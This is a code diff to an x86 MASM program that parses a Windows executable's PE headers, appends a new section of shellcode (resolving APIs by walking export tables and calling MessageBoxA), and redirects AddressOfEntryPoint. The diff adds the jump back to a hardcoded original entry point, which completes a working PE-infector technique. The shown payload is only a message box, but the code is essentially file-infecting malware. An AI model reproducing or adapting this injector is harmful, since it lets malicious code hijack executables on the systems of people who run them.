@@ -1,4 +1,3 @@
-﻿;EasyCodeName=Project1,1
 .386
 Option CaseMap:None
 
@@ -13,19 +12,17 @@ Extrn getchar:Near
 SIZEOF_IMAGE_FILE_HEADER 			Equ 14H
 SIZEOF_NT_SIGNATURE 				Equ SizeOf DWord
 SIZEOF_OPTIONAL_HEADER 				Equ 224
-IMAGE_SCN_MEM_READ_CODE_EXECUTE		Equ 60000020H
+IMAGE_SCN_MEM_READ_CODE_EXECUTE			Equ 60000020H
 
 .Data
-    	filePath        DB  "C:\\Users\\Avenger\\Desktop\\Test\\DXCpl.exe", 0
-    	errorMsg        DB  "Error occurred while processing the file.", 0
-    	exitMsg         DB  "Press enter to exit the program....", 0
-    	sectionName	DB	".abc", 0
-    	sectionNameSize Equ SizeOf sectionName
-    	newline         DB  13, 10, 0
-    	NT_Header       DD ?
-    	fileHandle 	HANDLE 0
-    	fileMapping 	HANDLE 0
-    	viewOfFile 	PVOID 0
+    	filePath        	DB  "C:\\Users\\Avenger\\Desktop\\Test\\DXCpl.exe", 0
+    	errorMsg        	DB  "Error occurred while processing the file.", 0
+    	exitMsg         	DB  "Press enter to exit the program....", 0
+    	newline         	DB  13, 10, 0
+    	NT_Header       	DD ?
+    	fileHandle 		HANDLE 0
+    	fileMapping 		HANDLE 0
+    	viewOfFile 		PVOID 0
 
 .data?
     	OptionalHeader      	DD ?
@@ -74,7 +71,7 @@ start:
     	Add Ebx, 18H						; Move to OptionalHeader
     	Mov OptionalHeader, Ebx
     	Mov Esi, DWord Ptr [OptionalHeader]
-    	Add Esi, 1CH                        ; Move to the ImageBase field
+    	Add Esi, 1CH                        			; Move to the ImageBase field
     	Mov Ecx, [Esi]
     	Mov imageBase, Ecx
 
@@ -90,7 +87,7 @@ start:
     	Mov Ecx, [Esi]
     	Mov sizeOfImage, Ecx
 
-    	Mov Ecx, [Ebx + 10H]      ; Get the AddressOfEntryPoint
+    	Mov Ecx, [Ebx + 10H]     				; Get the AddressOfEntryPoint
     	Mov AddressOfEntryPoint, Ecx
     	Xor Eax, Eax
     	Mov Eax, AddressOfEntryPoint
@@ -126,6 +123,7 @@ start:
 	Add Edi, 4H
 	Mov Eax, [Edi]
 	Mov lastSection.PointerToRawData, Eax
+	Jmp newSectionInitialize
 
 shellcode:
 	Assume Fs:Nothing
@@ -190,7 +188,7 @@ getFunctionPosition:
 	Jz getFunctionAddress					; If found the name then jump to getFunctionAddress
 	Inc Eax
 	Cmp Eax, [Ebp - 4H]					; Check for if counter < number of functions
-	Jne getFunctionPosition ; Loop
+	Jne getFunctionPosition 				; Loop
 
 ; Calculate the ordinal of the function: (Address of ordinal table + position * sizeof(Ordinal))
 ; After got the ordinal then calculate the RVA of the function address: (RVA AddressOfFunction + ordinal * sizeof(FunctionRVA))
@@ -267,6 +265,11 @@ invokeFunction:
 	Push Edx						; lpText
 	Push 0							; hWnd
 	Call Eax						; MessageBoxA
+	Mov Eax, 4499A0H
+	Push Eax
+	Ret
+
+newSectionInitialize:
 	codeSize = $ -shellcode
 
 	; Calculate new section information
@@ -319,7 +322,7 @@ invokeFunction:
     	Inc Eax             							; Increment the number of sections
     	Mov NumberOfSections, Ax 						; Load the updated value
     	Sub Esi, viewOfFile							; Get the actual offset on the disk
-    	Invoke SetFilePointer, fileHandle, Esi, NULL, FILE_BEGIN ; Set file pointer to the location of NumberOfSections
+    	Invoke SetFilePointer, fileHandle, Esi, NULL, FILE_BEGIN 		; Set file pointer to the location of NumberOfSections
     	Invoke WriteFile, fileHandle, Offset NumberOfSections, SizeOf Word, Addr BytesWritten, NULL ; Write the updated value
 
 	; Modify the AddressOfEntryPoint
